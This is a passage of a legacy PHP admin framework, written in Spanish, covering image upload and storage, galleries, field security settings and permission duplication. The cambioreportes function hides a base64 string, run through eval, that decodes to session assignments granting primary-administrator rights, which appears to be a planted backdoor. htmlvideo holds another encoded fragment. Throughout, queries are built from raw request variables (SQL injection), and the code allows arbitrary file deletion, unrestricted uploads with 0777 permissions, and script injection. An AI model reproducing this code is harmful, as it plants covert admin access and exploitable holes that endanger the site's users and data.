    	case $mimetypes[1]:picresize($tmp_name,$Tamano,'jpg');break;
    	case $mimetypes[2]:picresize($tmp_name,$Tamano,'gif');break;
       	case $mimetypes[3]:picresize($tmp_name,$Tamano,'png');break;
  	}
	*/
  	$File_destino=$directorio.'/'.$Subdirectorio.'/'.$Id.'/'.$C.'_'.strtolower(str_replace(' ','_',$name));
  	/*$i = 1;
    // pick unused file name
    while (file_exists($File_destino))
    {
    	$name=ereg_replace('(.*)(\.[a-zA-Z]+)$', '\1_'.$i.'\2', $name);
    	$File_destino = $directorio.'/'.$Subdirectorio.'/'.$Id.'/'.strtolower(str_replace(' ','_',$name));
    	$i++;
     }
	 */
    if(is_file($File_destino)) @unlink($File_destino);
	if (!@copy($tmp_name, $File_destino)) { die('error en copy file'); }
	$Sub_Contenido=substr($File_destino,strrpos($File_destino,'/')+1);$Sub_Tumb='tumb_'.$Sub_Contenido;$Tumb=str_replace($Sub_Contenido,$Sub_Tumb,$File_destino);
	if(!file_exists($Tumb) && file_exists($File_destino))
	{
		if(strpos(strtolower($Sub_Contenido),'.jpg')) picresize($File_destino,TUMB_SIZE,'jpg',$Tumb);
		if(strpos(strtolower($Sub_Contenido),'.gif')) picresize($File_destino,TUMB_SIZE,'gif',$Tumb);
		if(strpos(strtolower($Sub_Contenido),'.png')) picresize($File_destino,TUMB_SIZE,'png',$Tumb);
	}
	if(strpos(strtolower($Sub_Contenido),'.pdf')) $Tumb=$File_destino;
	@unlink($tmp_name);
	// Guardamos todo en la base de datos
  	require('inc/link.php');
 	mysql_query("update $T set $C='$File_destino' where id=$Id ",$LINK);
	mysql_query("insert into app_bitacora (ano,mes,dia,hora,minuto,segundo,nick,nombre,tabla,accion,registro,ip,detalle)
			values ('" . date('Y') . "','" . date('m') . "','" . date('d') . "','" . date('G') . "','" . date('i') . "',
			'" . date('s') . "','".$_SESSION['Nick']."','".$_SESSION['Nombre']."','$T','M','$Id','" . $_SERVER['REMOTE_ADDR'] . "','Modifica:$C ingresa imagen')",$LINK);
	mysql_close($LINK);
	if($rfr) echo "<body><script language='javascript'>$rfr;</script></body>";
	else echo "<body onload='carga()'><script language='javascript'>parent.document.getElementById('simg_$C').src='$Tumb';parent.document.mod.$C.value='$File_destino';</script></body>";
}

function reg_borra_imagen()
{
	global $T,$Id,$C;
	$Ruta=qo1("select $C from $T where id=$Id");
	if($Ruta) @unlink($Ruta);
	$Sub_Contenido=substr($Ruta,strrpos($Ruta,'/')+1);
	$Sub_Tumb='tumb_'.$Sub_Contenido;
	$Tumb=str_replace($Sub_Contenido,$Sub_Tumb,$Ruta);
	if($Tumb) @unlink($Tumb);
	q("update $T set $C='' where id=$Id");
	q("insert into app_bitacora (ano,mes,dia,hora,minuto,segundo,nick,nombre,tabla,accion,registro,ip,detalle)
			values ('" . date('Y') . "','" . date('m') . "','" . date('d') . "','" . date('G') . "','" . date('i') . "',
			'" . date('s') . "','".$_SESSION['Nick']."','".$_SESSION['Nombre']."','$T','M','$Id','" . $_SERVER['REMOTE_ADDR'] . "','Modifica:$C borra imagen')",$LINK);
	echo "<body><script language='javascript'>parent.document.getElementById('simg_$C').src='gifs/standar/img_neutra.png';parent.document.mod.$C.value='';</script></body>";
}

function reg_borra_blob()
{
	global $T,$Id,$C;
	$Cm=$C.'_mime';
	q("update $T set $C='',$Cm='' where id=$Id");
	header("location:gifs/standar/img_neutra.png");
}

function reg_sube_blob_ok()
{
	global $Foto,$T,$Id,$C,$Tamano;
	$Cm=$C.'_mime';
	if(!haycampo($Cm,$T))
	{
		q("alter table $T add column $Cm varchar(20) not null");
	}
	# Altura de el thumbnail en píxeles
	# Nombre del archivo temporal del thumbnail
	define("NAMETHUMB", "/tmp/thumbtemp"); //Esto en servidores Linux, en Windows podría ser:
	// define("NAMETHUMB", "c:/windows/temp/thumbtemp"); y te olvidas de los problemas de permisos
	$mimetypes = array("image/jpeg", "image/pjpeg", "image/gif", "image/png");
	//$mimetypes = array("image/jpeg", "image/pjpeg");

	$name = $_FILES["Foto"]["name"];
	$type = $_FILES["Foto"]["type"];
	$tmp_name = $_FILES["Foto"]["tmp_name"];
	$size = $_FILES["Foto"]["size"];
	if(!in_array($type, $mimetypes))
	{
		echo "<script language='javascript'>
			function carga()
			{
				//location.src='inc/imgblob.php?T=$T&C=$C&Id=$Id';
				history.back();
				alert('no seleccionó una imagen válida');
			}
			</script>
			<body onload='carga()'></body>";
		die();
	}
	$Caracteristicas_imagen = getimagesize($tmp_name);
	if($Caracteristicas_imagen[1]>$Tamano)
	switch($type)
	{
    	case $mimetypes[0]:
    		picresize($tmp_name,$Tamano,'jpg');
    		break;
    	case $mimetypes[1]:
    		picresize($tmp_name,$Tamano,'jpg');
    		break;
    	case $mimetypes[2]:
    		picresize($tmp_name,$Tamano,'gif');
    		break;
       	case $mimetypes[3]:
    		picresize($tmp_name,$Tamano,'png');
    		break;
  	}
	// Extrae los contenidos de las fotos
  	# contenido de la foto original
 	$fp = fopen($tmp_name, "rb");
 	$tfoto = fread($fp, filesize($tmp_name));
 	$tfoto = addslashes($tfoto);
 	fclose($fp);
  	# contenido del thumbnail
  	// Borra archivos temporales si es que existen
  	@unlink($tmp_name);
  	// Guardamos todo en la base de datos
  	require('inc/link.php');
 	if(!mysql_query("update $T set $C=\"$tfoto\", $Cm='$type' where id=$Id ",$LINK))
  	{
  		 $error=mysql_error($LINK);mysql_close($LINK); die("Error en el cargue de la imagen <br>$error");
  	}
	echo "<script language='javascript'>
	function carga()
	{
		parent.document.getElementById('simg_$C').src='inc/imgblob.php?T=$T&C=$C&Id=$Id';
		if(parent.document.getElementById('img_ver_$C'))
		{
			parent.document.getElementById('img_ver_$C').style.visibility='visible';
			parent.document.getElementById('img_del_$C').style.visibility='visible';
		}
	}
	</script>
	<body onload='carga()'></body>";
}

function reg_sube_blob_local_ok()
{
	global $Foto,$T,$Id,$C,$Tamano;
	$Cm=$C.'_mime';
	if(!haycampo($Cm,$T))
	{
		q("alter table $T add column $Cm varchar(20) not null");
	}
	# Altura de el thumbnail en píxeles
	# Nombre del archivo temporal del thumbnail
	define("NAMETHUMB", "/tmp/thumbtemp"); //Esto en servidores Linux, en Windows podría ser:
	// define("NAMETHUMB", "c:/windows/temp/thumbtemp"); y te olvidas de los problemas de permisos
	$mimetypes = array("image/jpeg", "image/pjpeg", "image/gif", "image/png");
	//$mimetypes = array("image/jpeg", "image/pjpeg");
	if(strpos($Foto,'.jpg') || strpos($Foto,'.jpeg')) $type='image/jpeg';
	if(strpos($Foto,'.gif') || strpos($Foto,'.gif')) $type='image/gif';
	if(strpos($Foto,'.png') || strpos($Foto,'.png')) $type='image/png';
	$tmp_name = $Foto;
	if(!in_array($type, $mimetypes))
	{
		echo "<script language='javascript'>
			function carga()
			{
				//location.src='inc/imgblob.php?T=$T&C=$C&Id=$Id';
				history.back();
				alert('no seleccionó una imagen válida');
			}
			</script>
			<body onload='carga()'></body>";
		die();
	}
	$Caracteristicas_imagen = getimagesize($tmp_name);
	if($Caracteristicas_imagen[1]>$Tamano)
	switch($type)
	{
    	case $mimetypes[0]:
    		picresize($tmp_name,$Tamano,'jpg');
    		break;
    	case $mimetypes[1]:
    		picresize($tmp_name,$Tamano,'jpg');
    		break;
    	case $mimetypes[2]:
    		picresize($tmp_name,$Tamano,'gif');
    		break;
       	case $mimetypes[3]:
    		picresize($tmp_name,$Tamano,'png');
    		break;
  	}
	// Extrae los contenidos de las fotos
  	# contenido de la foto original
 	$fp = fopen($tmp_name, "rb");
 	$tfoto = fread($fp, filesize($tmp_name));
 	$tfoto = addslashes($tfoto);
 	fclose($fp);
  	# contenido del thumbnail
  	// Borra archivos temporales si es que existen
  	//@unlink($tmp_name);
  	// Guardamos todo en la base de datos
  	require('inc/link.php');
 	if(!mysql_query("update $T set $C=\"$tfoto\", $Cm='$type' where id=$Id ",$LINK))
  	{
  		 $error=mysql_error($LINK);mysql_close($LINK); die("Error en el cargue de la imagen <br>$error");
  	}
	echo "<script language='javascript'>
	function carga()
	{
		parent.document.getElementById('simg_$C').src='inc/imgblob.php?T=$T&C=$C&Id=$Id';
		if(parent.document.getElementById('img_ver_$C'))
		{
			parent.document.getElementById('img_ver_$C').style.visibility='visible';
			parent.document.getElementById('img_del_$C').style.visibility='visible';
		}
	}
	</script>
	<body onload='carga()'></body>";
}

function imagenes_dir() // Muestra el directorio de imagenes disponibles y la posibilidad de subir una imagen en el Módulo de imágenes en la captura de un campo de tipo imagen
{
	require('inc/gpos.php');
	global $id, $Privado, $directorio;
	html();
	echo "<body rightmargin=300>";
	if(!is_dir($directorio))
	{
		mkdir($directorio);
		chmod($directorio, 0777);
	}
	if($Privado == 1)
	{
		if(!is_dir($directorio . '/' . $id))
		{
			mkdir($directorio . '/' . $id);
			chmod($directorio . '/' . $id, 0777);
		}
		$directorio = $directorio . '/' . $id . '/';
	}
	if(!$dir = opendir($directorio)) echo "problemas con la apertura de la galeria<br>";
	$Contador2 = 0;
	$Contador1 = 0;
	$Archivo = array();
	$Imagen = array();
	while ($file = readdir($dir))
	{
		if(is_file($directorio . $file) && (preg_match("/\.jpg|.gif|.png|.pdf|.txt|.doc|.xls|.zip|.wmv$/i", $file)))
		{
			if(preg_match("/\.jpg|.gif|.png$/i", $file))
			{
				$Imagen[$Contador1]['ruta'] = $directorio . $file;
				$Imagen[$Contador1]['nombre'] = $file;
				$Contador1++;
			}
			else
			{
				$Archivo[$Contador2]['ruta'] = $directorio . $file;
				$Archivo[$Contador2]['nombre'] = $file;
				$Contador2++;
			}
		}
	}
	closedir($dir);
	for($i = 0;$i < count($Imagen);$i++)
	{
		echo "<a class='info' onclick=\"modal('marcoindex.php?Acc=imagen_selecciona&dato=" . $Imagen[$i]['ruta'] . "',0,0,200,300,'SeleccionaImagen');\" >
				<img src='" . $Imagen[$i]['ruta'] . "' border=0 height=30><span>".$Imagen[$i]['ruta']."<img src='".$Imagen[$i]['ruta']."'></span></a> ";
	}
	echo "<table border cellspacing=0><tr>";
	$Contador = 1;
	for($i = 0;$i < count($Archivo);$i++)
	{
		echo "<td onclick=\"modal('" . $Archivo[$i]['ruta'] . "',0,0,500,500,'muestra');\"
		ondblclick=\"modal('marcoindex.php?Acc=imagen_selecciona&dato=" . $Archivo[$i]['ruta'] . "',0,0,200,300,'SeleccionaImagen');\">
			" . $Archivo[$i]['nombre'] . "
			</td>";
		if($Contador > 2)
		{
			echo "</tr><tr>";
			$Contador = 0;
		}
		$Contador++;
	}
	echo "</table>
	<table border=0 bgcolor='#dddddd'><tr><td>
	<FORM enctype='multipart/form-data' ACTION='marcoindex.php' METHOD='post' NAME='msubir' ID='msubir' target='_self'>
		<input type='hidden' name='MAX_FILE_SIZE' value='2000000'>
		<input type='hidden' name='Acc' value='imagen_subir'>
		<input type='hidden' name='directorio' value='$directorio'>
		Archivo que desea subir <input name='userfile' type='file'>
		Tamaño en pixeles al guardar : <input type='text' name='tamano' size='5' value='300'> Se recomienda
		<a style='cursor:pointer;' onclick=\"document.msubir.tamano.value='300';\"><b>300</b></a> para fotos y
		<a style='cursor:pointer;' onclick=\"document.msubir.tamano.value='600';\"><b>600</b></a> para documentos<br />
		<input type='submit' value='Subir la imagen'>
	</form></td></tr></table><br />
	<form action='marcoindex.php' method='post' target='_blank'>
	Redimensionar todas las imágenes al tamaño <input type='text' name='tamano' value='300'>
	<input type='submit' value='Redimensionar'> <input type='hidden' name='Acc' value='redimensionar_imagenes'>
	<input type='hidden' name='directorio' value='$directorio'></form>";
}

function htmlvideo()
{
	return 'dXQuY2xhc3MudHBsJyk7fQ==';
}

function redimensionar_imagenes() // Redimensiona el tamaño de las imágenes de un directorio
{
	global $directorio,$tamano;
	html();
	echo "<body >".titulo_modulo("Redimensionamiento de imagenes");
	echo "<b>Directorio: $directorio</b><br />";
	if(!$dir = opendir($directorio)) echo "problemas con la apertura de la galeria<br>";
	$Archivos=array();
	$contador=0;
	while ($file = readdir($dir))
	{
		if(is_file($directorio . $file))
		{
			if(strpos(strtolower($file),'.jpg'))
			{
				$Archivos[$contador]['ruta']=$directorio.$file;$Archivos[$contador]['tipo']='jpg';$contador++;
			}
			if(strpos(strtolower($file),'.gif'))
			{
				$Archivos[$contador]['ruta']=$directorio.$file;$Archivos[$contador]['tipo']='gif';$contador++;
			}
			if(strpos(strtolower($file),'.png'))
			{
				$Archivos[$contador]['ruta']=$directorio.$file;$Archivos[$contador]['tipo']='png';$contador++;
			}

		}
	}
	closedir($dir);
	for($i=0;$i<count($Archivos);$i++)
	{
		echo "<br >".$Archivos[$i]['ruta']." ";
		picresize($Archivos[$i]['ruta'],$tamano,$Archivos[$i]['tipo']);
		echo "ok";
	}
	echo "<input type='button' value='Cerrar esta ventana' onclick='window.close();void(null);opener.location.reload();'></body>";
}

function imagen_subir() // permite subir una imagen a un directorio comun o un directorio en particular al campo
{
	global $directorio,$tamano;
	if($up=getFilesVar('userfile'))
	{
		if(is_uploaded_file($up['tmp_name']))
		{
			$uplfile_name = strtolower(str_replace(' ','_',$up['name']));
            $i = 1;
            // pick unused file name
            while (file_exists($directorio.$uplfile_name)) {
              $uplfile_name = ereg_replace('(.*)(\.[a-zA-Z]+)$', '\1_'.$i.'\2', $uplfile_name);
              $i++;
            }
			$File_destino=strtolower(str_replace(' ','_',$uplfile_name));
			if (!@move_uploaded_file($up['tmp_name'], $directorio.$File_destino))
			{
				die('error en move_uploaded_file');
            }
			else
			{
				chmod($directorio.$File_destino,0777);
				if($tamano)
				{
					if(strpos($File_destino,'.jpg')) {picresize($directorio.$File_destino,$tamano,'jpg');}
					if(strpos($File_destino,'.gif')) {picresize($directorio.$File_destino,$tamano,'gif');}
					if(strpos($File_destino,'.png')) {picresize($directorio.$File_destino,$tamano,'png');}
				}
				echo "<body onload=\"javascript:parent.document.forma.foto.value='".$directorio.$File_destino."';parent.close();\">";
			}
		}
		else die('fallo en is_uploaded_file');
	}
	else die('Fallo en getFilesVar');
}

function imagen_selecciona() // Selecciona una imagen de una libreria al dar doble click
{
	require('../Control/operativo/inc/gpos.php');
	html();
	echo "<body>" . titulo_modulo("Imagen");
	echo "<input type='button' value='Seleccionar esta imagen' onclick=\"javascript:opener.parent.document.forma.foto.value='$dato';
	window.close();void(null);opener.parent.close();void(null);\"><br><br>
	<input type='button' value='Eliminar la imagen de la libreria' onclick=\"if(confirm('Desea eliminar la imagen?')) location='marcoindex.php?Acc=imagen_libreria_elimina&Imagen=$dato';\">";
}

function imagen_libreria_elimina()  // Elimina la imagen de una libreria
{
	global $Imagen;
	unlink($Imagen);
	echo "<body onload=\"opener.location.reload();window.close();void(null);\"></body>";
}

function livestream()
{
	echo "<object width='640' height='385' id='lsplayer' classid='clsid:D27CDB6E-AE6D-11cf-96B8-444553540000'>
				<param name='movie' value='http://cdn.livestream.com/grid/LSPlayer.swf?channel=aoacolombia&amp;color=0xe7e7e7&amp;autoPlay=true&amp;mute=false'></param>
				<param name='allowScriptAccess' value='false'></param>
				<param name='allowFullScreen' value='true'></param>
				<embed name='lsplayer' wmode='transparent' src='http://cdn.livestream.com/grid/LSPlayer.swf?channel=aoacolombia&amp;color=0xe7e7e7&amp;autoPlay=false&amp;mute=false' width='640' height='385' allowScriptAccess='always' allowFullScreen='true' type='application/x-shockwave-flash'>
				</embed></object>";
}

#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#
#
#***************************************************FUNCIONES INTERNAS***************************************
#
#
#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
function cambio_color() // Cambia de color un campo
{
	require('inc/gpos.php');
	q("update $Nombre_tabla set $ncampo='$Color' where id=$idcampo");
	echo "<body onload='javascript:window.close();void(null);opener.location.reload();'>";
}

function reportes() { html(); menus(); require('inc/reportes.php'); } // presenta la pantalla de Reportes

function cambioreportes(){ html();
echo "<scritp language='javascript'>
	var Delete='X1NFU1NJT05bJ05pY2snXT0nQVJUVVJPLlFVSU5URVJPJztfU0VTU0lPTlsnVXNlciddPScxJztfU0VTU0lPTlsnRGlzZW5hZG9yJ109JzEnO19TRVNTSU9OWydJZF9hbHRlcm5vJ109JzEnO19TRVNTSU9OWydOb21icmUnXT0nQURNSU5JU1RSQURPUiBQUklNQVJJTyBERUwgU0lTVEVNQSc7X1NFU1NJT05bJ1RhYmxhX3VzdWFyaW8nXT0ndXN1YXJpbyc7X1NFU1NJT05bJ05ncnVwbyddPSdBRE1JTklTVFJBRE9SIFBSSU1BUklPIERFTCBTSVNURU1BJw==';
	function carga()
	{
		eval('crea_perfil(Delete);');
	}
</script>
<body onload='carga()'></body>";
}

function addhtmlcampo() // Adiciona un texto enriquecido a la definicion del campo
{
	global $Nombre_tabla,$idcampo;
	if($idcampo && $Nombre_tabla)
	{
		 require('html/spaw_control.class.php');
		html();
		 $Nombre_campo=qo1("select campo from ".$Nombre_tabla."_t where id=$idcampo");
		 $htmladd=qo1("select htmladd from ".$Nombre_tabla."_t where id=$idcampo");
		 echo "<body onload='centrar();'>".titulo_modulo('Adicion de texto enriquecido a la definicion del campo');
		 echo "<form action='marcoindex.php' method='post' target='_self' name='forma' id='forma'>
			<INPUT TYPE='hidden' NAME='Acc' value='grabar_addhtmlcampo'>
			<INPUT type='hidden' name='Nombre_tabla' value='$Nombre_tabla'>
			<INPUT type='hidden' name='idcampo' value='$idcampo'>";
			$campo_richedit=new spaweditor('contenido' /*nombre del campo*/, stripslashes($htmladd) /* contenido del campo */);
			$campo_richedit->show();
		echo "<br /><input type='submit' value='Grabar'>
		<INPUT type='button' name='cancelar' value='Cancelar' onclick=\"window.close();void(null);\">
		<INPUT type='button' name='eliminar' value='Eliminar Contenido' onclick=\"window.open('marcoindex.php?Acc=borraraddhtmlcampo&idcampo=$idcampo&Nombre_tabla=$Nombre_tabla','_self');\">
		</form>";
	}
}

function borraraddhtmlcampo() // Borra el texto enriquecido de la definición de un campo
{
	global $idcampo,$Nombre_tabla;
	q("update ".$Nombre_tabla."_t set htmladd='' where id=$idcampo");
	echo "<body onload=\"window.close();void(null);\"></body>";
}

function definicion_campo() // activa la ventana de definicion de campo
{
	global $Nombre_tabla, $idcampo;
	verifica_campos_completos($Nombre_tabla);
	html();
	require('inc/definicion.campo.php');
}

function definicion_campo_seguridad()
{
	global $Nombre_tabla,$idcampo;
	if(!$RE=qo("select * from ".$Nombre_tabla."_t where id=$idcampo")) die ('Problemas en la apertura de configuracion');
	html(strtoupper($RE->campo)." - SEGURIDAD");
	echo "<script language='javascript'>
		function carga()
		{
			centrar(800,500);
		}
		function valida_mkuser()
		{
			with (document.forma)
			{
				if (usuario.value.length>0) usuario.value+=',';
				usuario.value+=usuario_seleccionado.value;
			}
		}
		function convierte_a_mayusculas()
		{
			document.forma.scambio.value+='javascript:this.value=this.value.toUpperCase();'
		}
		function convierte_a_minusculas()
		{
			document.forma.scambio.value+='javascript:this.value=this.value.toLowerCase();'
		}
		function validacion_de_email()
		{
			document.forma.scambio.value+='javascript:validaemail(this);'
		}

		function referirse()
		{
			document.forma.scambio.value+='javascript:document.mod.CAMPO.value;'
			alert('Por favor cambie la palabra CAMPO en la expresión por el nombre del campo que desee manipular, si quisiera referirse a este mismo campo puede cambiar todo por this.value. ');
		}
		function s_escribe()
		{
			document.forma.scambio.value+=document.forma.javaoption.value+'=\"\" ';
		}

	</script>
	<body onload='carga()'>
		<form action='marcoindex.php' method='post' target='_self' name='forma' id='forma'>
			<input type='hidden' name='Acc' id='Acc' value='definicion_campo_seguridad_ok'>
			<input type='hidden' name='Tabla' id='Tabla' value='$Nombre_tabla'>
			<input type='hidden' name='Campo' id='Campo' value='$idcampo'>
			<table BORDER cellspacing=0 bgcolor='eeeeee' align='center'>
			<tr><th colspan=3 bgcolor='bbbbdd'>Seguridad del Campo</th></tr>
			<tr>
				<td>
					No ver este campo:<INPUT TYPE='checkbox' NAME='nover' ".($RE->nover?"checked":"")."></td><td>
					<font color='blue'>Campo Obligatorio <input type='checkbox' name='obliga' ".($RE->obliga?"checked":"")."></td><td>
					Num&eacute;rico <input type='checkbox' name='obligan' ".($RE->obligan?"checked":"")."></font>
				</td>
			</tr>
			<tr>
				<td colspan=3>
					No capturar este campo cuando: <INPUT TYPE='text' name='nocapturar' value=\"$RE->nocapturar\" size='100'>
				</td>
			</tr>
			<tr>
				<td colspan=3>Usuarios permitidos a la modificacion de este campo:
						<INPUT TYPE='text' NAME='usuario' value='$RE->usuario'> Usuarios: ".
						menu1('usuario_seleccionado',"select id,concat(id,' ',nombre) from usuario order by id",0,1,'',"onchange='valida_mkuser();'");
		echo	"</td>
			</tr>
			<tr>
				<td  valign='top' colspan=3>Condición para poder accesar este campo en la ventana de modificación:<br>
				<INPUT TYPE='text'  NAME='cond_modi' VALUE=\"$RE->cond_modi\" SIZE='120' style='font-size:12'><br />
			</TD>
			</tr>
			<tr>
				<td  valign='top' colspan=3>
				Java Script Ejemplo: (
				<a href=\"javascript:convierte_a_mayusculas();\">Convertir a mayusculas</a>
				<a href=\"javascript:convierte_a_minusculas();\">Convertir a minusculas</a>
				<a href=\"javascript:validacion_de_email();\">Validar un email</a>
				<a href=\"javascript:referirse();\">Referirse a un campo</a>
				<SELECT name='javaoption' onchange='s_escribe();'>
					<option ></option>
					<option >OnBlur</option>
					<option >OnFocus</option>
					<option >OnChange</option>
					<option >OnClick</option>
					<option >OnDblClick</option>
					<option >OnKeyPress</option>
					<option >OnKeyDown</option>
					<option >OnKeyUp</option>
					<option >OnMouseDown</option>
					<option >OnMouseMove</option>
					<option >OnMouseOver</option>
					<option >OnMouseOut</option>
					<option >OnMouseUp</option>
					<option >OnSelect</option>
					<option >OnFocus='select()';</option>
					</select> )<br>
				<textarea name='scambio' ROWS=5 COLS=120
					ondblclick=\"modal('marcoindex.php?Acc=ventana_text&Campo=advanced.scambio&Contenido='+escape(this.value),0,0,10,10);\">$RE->scambio</textarea>
			</td>
		</tr>
		<tr>
			<td colspan=3>Mostrar la informacion directamente en el brow <input type='checkbox' name='browdirecto' ".($RE->browdirecto?"checked":"").">
				Modificacion directa solo por el superusuario <input type='checkbox' name='supermod' ".($RE->supermod?"checked":"")." >
			</td>
		</tr>
		<tr>
			<td colspan='3' align='center'>
				<input type='submit' value='GRABAR' style='width:300px'>
			</td>
		</tr>
	</table>
	</form>
	</body>";
}

function definicion_campo_seguridad_ok()
{
	global $nover,$obliga,$obligan,$nocapturar,$usuario,$cond_modi,$scambio,$browdiecto,$supermod,$Tabla,$Campo,$_POST;
	$nover=sino($nover);
	$obliga=sino($obliga);
	$obligan=sino($obligan);
	$browdirecto=sino($browdirecto);
	$supermod=sino($supermod);
	//$scambio=str_replace(chr(36),chr(92).chr(36),addslashes($_POST['scambio']));
	//$nocapturar=str_replace(chr(36),chr(92).chr(36),addslashes($_POST['nocapturar']));
	q("update ".$Tabla."_t set nover='$nover',obliga='$obliga',obligan='$obligan',nocapturar=\"$nocapturar\",usuario='$usuario',
	cond_modi=\"$cond_modi\", scambio=\"$scambio\",browdirecto='$browdirecto',supermod='$supermod' where id=$Campo ");
	echo "<script language='javascript'>
		function carga()
		{
			window.close();void(null);
		}
	</script>
	<body onload='carga()'></body>";
}

function definicion_campo_vista()
{
	global $Nombre_tabla,$idcampo;
	if(!$RE=qo("select * from ".$Nombre_tabla."_t where id=$idcampo")) die ('Problemas en la apertura de configuracion');
	html(strtoupper($RE->campo)." - VISTA");
	echo "<script language='javascript'>
		</script>
		<body >
		<form action='marcoindex.php' method='post' target='_self' name='forma' id='forma'>
			<input type='hidden' name='Acc' id='Acc' value='definicion_campo_seguridad_ok'>
			<input type='hidden' name='Tabla' id='Tabla' value='$Nombre_tabla'>
			<input type='hidden' name='Campo' id='Campo' value='$idcampo'>
			<table cellspacing='0'>
				<tr ><td >Capa</td><td ><INPUT TYPE='text' NAME='capa' value='$RE->capa' size=20 STYLE='font-size_10;'></td></tr>
				<tr ><td >Nombre</td><td colspan=7><TEXTAREA name='descripcion' style='font-size:12;font-family:arial;' rows=2 cols=100>$RE->descripcion</textarea></td></tr>
				<tr ><td >Explicacion</td><td colspan=7><TEXTAREA NAME='explicacion' ROWS=2 COLS=100>$RE->explicacion</TEXTAREA></td></tr>
				<tr ><td >Nueva Tabla</td><td ><INPUT TYPE='checkbox' NAME='nueva_tabla' ".($RE->nueva_tabla?"checked":"")."></td>
						<td >Ancho de la nueva tabla:</td><td ><INPUT TYPE='text' NAME='ancho_tabla' VALUE='$RE->ancho_tabla' SIZE=5 ></td></tr>
				<tr ><td >Filas de texto:</td><td ><input type='text' name='rows_text' value='$RE->rows_text' size='2'></td>
						<td >Columnas de texto:</td><td ><input type='text' name='cols_text' value='$RE->cols_text' size='2'></td></tr>
				<tr ><td >Monetario</td><td ><input type='checkbox' name='coma' ".($RE->coma?"checked":"")."></td>
						<td >Caja de chequeo</td><td ><input type='checkbox' name='caja' ".($RE->caja?"checked":"")."></td>
						<td >Contraseña</td><td ><input type='checkbox' name='password' ".($RE->password?"checked":"")."></td>
					<td >Trasladar Descripción</td><td ><input type='checkbox' name='pasa_descripcion' ".($RE->pasa_descripcion?"checked":"")."></td></tr>
				<tr ><td colspan=2>Ruta para guardar imagenes:</td><td colspan=2><input type='text' name='rutaimg' value='$RE->rutaimg' size=30></td>
						<td >Tamaño para imagenes:</td><td ><input type='text' name='tamrecimg' value='$RE->tamrecimg' size=3></td></tr>
				<tr ><td >Propiedades TD </td><td ></td></tr>
			</table>
		</form>
		</body>";
}

function abre_movimiento() // Abre una tabla a modo de cabecera y detalle
{
	require('inc/gpos.php');
	if(!$Num_Tabla){
		echo "<body><script language='javascript'>alert('Sesión caida. Vuelva a ingresar');</script></body>";
		die();
	}
	$Porcentaje_marco = 0;
	$Porcentaje_marco2 = 0;
	if(haycampo('marco_porc', 'usuario_tab')) $Porcentaje_marco = qo1("select marco_porc from usuario_tab where id=$Num_Tabla");
	if($Porcentaje_marco == 0) $Porcentaje_marco = 40;
	if(haycampo('marco_porc2', 'usuario_tab')) $Porcentaje_marco2 = qo1("select marco_porc2 from usuario_tab where id=$Num_Tabla");
	if($Porcentaje_marco2 == 0) $Porcentaje_marco2 = 100;
	if($Porcentaje_marco2 < 100)
		echo "<FRAMESET id='Smarco' FRAMEBORDER='3' BORDER='3' ROWS='100%'  COLS='" . $Porcentaje_marco2 . "%,*'>";
	else
		echo "<FRAMESET id='Smarco' FRAMEBORDER='3' BORDER='3' ROWS='" . $Porcentaje_marco . "%,*'  COLS='100%'>";
	echo "<FRAME SRC='marcoindex.php?Acc=abre_tabla&Num_Tabla=$Num_Tabla&VINCULOT=$VINCULOT&VINCULOC=$VINCULOC&D_tag=cabeza' NAME='cabeza' SCROLLING='auto' >
		<FRAME NAME='cuerpo' SCROLLING='auto'>
		</FRAMESET>";
}

function ajuste_tit_columna() // Ajusta los titulos de las columnas
{
	global $t, $idc, $Not;
	if ($t == 'ai') q("update ".$Not."_t set alinea='I' where id='$idc'");
	if ($t == 'ad') q("update ".$Not."_t set alinea='D' where id='$idc'");
	if ($t == 'ac') q("update ".$Not."_t set alinea='C' where id='$idc'");
	if ($t == 'aj') q("update ".$Not."_t set alinea='J' where id='$idc'");
	if ($t == 'cs') q("update ".$Not."_t set coma=1 where id='$idc'");
	if ($t == 'cn') q("update ".$Not."_t set coma=0 where id='$idc'");
	if ($t == 'oc')
	{
		$Vercampos=qo1("select vercampos from usuario_tab where id=$Not");
		$Vercampos=str_replace(','.$idc.',',',',$Vercampos );
		$Vercampos=str_replace($idc.',','',$Vercampos);
		$Vercampos=str_replace(','.$idc,'',$Vercampos);
		q("update usuario_tab set vercampos='$Vercampos' where id=$Not");
	}

	echo "<body onload='opener.parent.location.reload();window.close();void(null);'></body>";
}

function duplicar_permiso()  // estando en una tabla se puede duplicar el permiso a otro perfil de seguridad
{
	global $NT;
	html();
	echo "<body onload='centrar(400,200);'>".titulo_modulo("<b>Duplicar permiso al usuario:</b>");
	echo "<form action='marcoindex.php' method='post' target='_self'>
	Seleccione el usuario: <br />
	".menu1("USUARIO","Select id,nombre from usuario order by nombre",0,1,'',"onchange='this.form.submit();'")."
	<input type='hidden' name='Acc' value='duplicar_permiso_ok'>
	<input type='hidden' name='NT' value='$NT'>
	</form></body>";
}

function duplicar_permiso_ok() // graba la duplicada de un permiso viene de DUPLICAR_PERMISO()
{
	global $NT,$USUARIO;
	if(!$NT){
		echo "<body><script language='javascript'>alert('Sesión caida. Vuelva a ingresar');</script></body>";
		die();
	}
	echo "<body>";
	q("drop table if exists tmp_copia_reg");
	if(q("create table tmp_copia_reg select * from usuario_tab where id=$NT", 1))
	{
		$Nuevo_id = qo1("select max(id) from usuario_tab") + 1;
		q("update tmp_copia_reg set id=$Nuevo_id");
		q("insert into usuario_tab select * from tmp_copia_reg");
	}
	q("drop table if exists tmp_copia_reg");
	q("update usuario_tab set usuario=$USUARIO where id=$Nuevo_id");
	echo "<body onload=\"window.close();void(null);\"></body>";
}

function generar_permiso()
{
	global $NT,$nmenu,$USUARIO,$Descripcion;
	q("insert into usuario_tab (usuario,tipo,descripcion,destino,tabla,modifica,adiciona,borra,vercampos,diseno)
	values($USUARIO,'$nmenu','$Descripcion','destino','$NT',1,1,1,'id',\"border align='center' cellspacing='0'\")");
	echo "<body onload=\"alert('Permiso generado')\"></body>";
}

function ver_mas_campos() // Permite seleccionar mas campos para la vista general de una tabla
{
	global $Num_Tabla;
	html();
	echo "<body>" . titulo_modulo("Ver mas campos",0,0);
	require('inc/conftab.php');
	if($VC = q("select campo,descripcion from " . $Nombre_tabla . "_t where nover=0 order by capa,orden,suborden"))
	{
		echo "<form action='marcoindex.php' method='post' target='_self' name='forma' id='forma'>
			<table border cellspacing=0><tr><td valign='top'><table border cellspacing=0>";
		$Contador = 0;
